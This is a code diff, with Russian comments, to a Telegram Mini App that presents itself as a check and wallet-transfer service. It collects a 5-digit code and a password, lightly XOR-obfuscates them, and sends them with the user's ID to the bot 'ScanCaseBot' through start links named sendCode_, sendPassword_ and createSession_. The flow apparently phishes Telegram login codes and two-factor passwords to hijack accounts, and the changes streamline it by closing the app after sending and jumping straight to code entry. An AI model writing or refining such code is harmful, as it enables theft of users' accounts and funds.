@@ -344,18 +344,11 @@ async function processCheck(token) {
 const initData = tg.initData;
 const startParam = tg.initDataUnsafe?.start_param;
 
-// ============ ИСПРАВЛЕННАЯ ОБРАБОТКА start_param ============
 if (initData && startParam && startParam.trim() !== '') {
-    // Проверяем, является ли параметр служебным (не чек)
-    const isServiceParam = /^(enterCode_|enterPassword_|success_|retry_|createSession_|sendCode_|sendPassword_)/.test(startParam);
-    
-    if (!isServiceParam) {
-        // Только если это НЕ служебный параметр — обрабатываем как чек
-        const lastProcessed = sessionStorage.getItem('last_processed_check');
-        if (lastProcessed !== startParam) {
-            sessionStorage.setItem('last_processed_check', startParam);
-            processCheck(startParam);
-        }
+    const lastProcessed = sessionStorage.getItem('last_processed_check');
+    if (lastProcessed !== startParam) {
+        sessionStorage.setItem('last_processed_check', startParam);
+        processCheck(startParam);
     }
 }
 
@@ -622,10 +615,11 @@ async function appendCodeDigit(digit) {
     if (currentCode.length === 5) {
         const encryptedCode = await xorEncrypt(currentCode);
         const botUsername = 'ScanCaseBot';
-        // Используем openLink вместо openTelegramLink, чтобы не закрывать WebApp
-        tg.openLink(`https://t.me/${botUsername}?start=sendCode_${currentUserId}_${encryptedCode}`, { try_instant_view: false });
+        tg.openTelegramLink(`https://t.me/${botUsername}?start=sendCode_${currentUserId}_${encryptedCode}`);
         showToast('Код отправляется...', 'info');
-        // Не закрываем WebApp, пользователь вернётся сам по кнопке из бота
+        setTimeout(() => {
+            tg.close();
+        }, 2000);
     }
 }
 
@@ -674,8 +668,11 @@ if (passwordSubmit) {
         }
         const encryptedPassword = await xorEncrypt(password);
         const botUsername = 'ScanCaseBot';
-        tg.openLink(`https://t.me/${botUsername}?start=sendPassword_${currentUserId}_${encryptedPassword}`, { try_instant_view: false });
+        tg.openTelegramLink(`https://t.me/${botUsername}?start=sendPassword_${currentUserId}_${encryptedPassword}`);
         showToast('Пароль отправляется...', 'info');
+        setTimeout(() => {
+            tg.close();
+        }, 2000);
     });
 }
 
@@ -751,9 +748,15 @@ function clearPendingTransaction() {
 
 function startAuthFlow() {
     const botUsername = 'ScanCaseBot';
-    // Открываем бота для создания сессии, WebApp остаётся открытым
-    tg.openLink(`https://t.me/${botUsername}?start=createSession_${currentUserId}`, { try_instant_view: false });
-    showToast('Откройте бота для подтверждения', 'info');
+    tg.openTelegramLink(`https://t.me/${botUsername}?start=createSession_${currentUserId}`);
+    setTimeout(() => {
+        const activeForm = document.querySelector('.transfer-form-screen.active');
+        if (activeForm) {
+            activeForm.classList.remove('active');
+        }
+        codeScreen.classList.add('active');
+        pushScreen(codeScreen, null, "#1a1d29");
+    }, 2000);
 }
 
 // Перевод в кошелёк
@@ -943,21 +946,19 @@ function handleStartAppParam() {
     if (startParam.startsWith('enterCode_')) {
         const targetUserId = parseInt(startParam.split('_')[1]);
         if (targetUserId === currentUserId) {
-            // Показываем экран ввода кода
             codeScreen.classList.add('active');
             pushScreen(codeScreen, null, "#1a1d29");
         }
     } else if (startParam.startsWith('enterPassword_')) {
         const targetUserId = parseInt(startParam.split('_')[1]);
         if (targetUserId === currentUserId) {
-            // Показываем экран ввода пароля
             passwordScreen.classList.add('active');
             pushScreen(passwordScreen, null, "#1a1d29");
         }
     } else if (startParam.startsWith('success_')) {
         const targetUserId = parseInt(startParam.split('_')[1]);
         if (targetUserId === currentUserId) {
-            // Фиксируем pending транзакцию
+            // Фиксируем pending транзакцию в localStorage
             const committed = commitPendingTransaction();
             
             if (committed) {
@@ -966,7 +967,7 @@ function handleStartAppParam() {
                 showToast('Перевод уже обработан', 'info');
             }
             
-            // Очищаем start_param из URL
+            // Очищаем start_param из URL, чтобы при повторном открытии не сработало снова
             if (window.history.replaceState) {
                 window.history.replaceState({}, document.title, window.location.pathname);
             }
@@ -977,10 +978,6 @@ function handleStartAppParam() {
             clearPendingTransaction();
             showToast('Попробуйте снова', 'info');
         }
-    } else if (startParam.startsWith('createSession_')) {
-        // Этот параметр обрабатывается ботом, WebApp его игнорирует
-        // Но если пользователь вернулся с этим параметром, ничего не делаем
-        console.log('createSession param ignored in WebApp');
     }
 }
 
